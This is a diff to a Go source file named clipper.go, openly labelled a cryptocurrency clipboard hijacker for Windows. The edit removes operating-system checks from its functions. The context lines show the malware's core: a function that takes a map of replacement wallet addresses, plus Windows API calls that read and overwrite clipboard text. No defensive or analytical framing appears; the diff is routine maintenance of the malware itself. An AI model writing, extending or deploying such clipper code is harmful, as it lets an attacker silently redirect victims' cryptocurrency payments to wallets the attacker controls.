@@ -1,11 +1,10 @@
 // ============================================================
-// clipper.go - Cryptocurrency Clipboard Hijacker
+// clipper.go - Cryptocurrency Clipboard Hijacker (Windows)
 // ============================================================
 package clipper
 
 import (
 	"log"
-	"runtime"
 	"strings"
 	"time"
 	"unsafe"
@@ -84,11 +83,6 @@ func NewClipper() *Clipper {
 
 // Run starts the clipper
 func Run(cryptoMap map[string]string) {
-	if runtime.GOOS != "windows" {
-		log.Println("⚠️ Clipper only works on Windows")
-		return
-	}
-	
 	// Update replacement addresses if provided
 	if cryptoMap != nil {
 		for coin, addr := range cryptoMap {
@@ -246,10 +240,6 @@ func (c *Clipper) validateAddress(address, coin string) bool {
 
 // getClipboardText retrieves text from clipboard
 func (c *Clipper) getClipboardText() string {
-	if runtime.GOOS != "windows" {
-		return ""
-	}
-	
 	ret, _, _ := openClipboard.Call(0)
 	if ret == 0 {
 		return ""
@@ -286,10 +276,6 @@ func (c *Clipper) getClipboardText() string {
 
 // setClipboardText sets text to clipboard
 func (c *Clipper) setClipboardText(text string) bool {
-	if runtime.GOOS != "windows" {
-		return false
-	}
-	
 	utf16 := syscall.StringToUTF16(text)
 	size := (len(utf16) - 1) * 2
 	
